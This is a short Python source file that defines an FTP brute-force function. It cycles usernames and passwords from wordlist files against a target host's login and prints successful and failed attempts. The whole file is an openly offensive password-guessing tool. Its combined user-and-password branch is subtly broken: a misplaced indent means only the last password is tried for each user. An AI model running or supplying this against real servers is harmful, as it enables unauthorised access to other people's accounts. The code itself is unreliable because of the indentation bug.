from ftplib import FTP

def bruteFTP(host, userfile, passfile, user=None, password=None):
    print(f"\nAttacking ftp://{host}....\n")
    try:
        if passfile and user:
            with open(passfile, 'r') as f:
                passwords = f.readlines()
            for password in passwords:
                password = password.strip()
                ftp = FTP(host)
                try:
                    ftp.login(user, password)
                    print(f'\033[92m [+]\033[0m {user} : ', password)
                    break

                except Exception as e:
                    # If login fails, print error message
                    print(f'\033[91m [-]\033[0m {user} : ', password)

        elif userfile and password:
            with open(userfile, 'r') as f:
                users = f.readlines()
            for user in users:
                user = user.strip()
                ftp = FTP(host)
                try:
                    ftp.login(user, password)
                    print(f'\033[92m [+]\033[0m {user} : ', password)
                    break

                except Exception as e:
                    # If login fails, print error message
                    print(f'\033[91m [-]\033[0m {user} : ', password)

        elif userfile and passfile:
            with open(userfile, 'r') as f:
                users = f.readlines()
            with open(passfile, 'r') as f:
                passwords = f.readlines()
            for user in users:
                user = user.strip()
                for password in passwords:
                    password = password.strip()
                    ftp = FTP(host)
                try:
                    ftp.login(user, password)
                    print(f'\033[92m [+]\033[0m {user} : ', password)
                    break

                except Exception as e:
                    # If login fails, print error message
                    print(f'\033[91m [-]\033[0m {user} : ', password)

        

    except KeyboardInterrupt:
        print('\033[91m [-]\033[0m Detecting Keyboard Interrupt...Exiting...')
        exit(1)

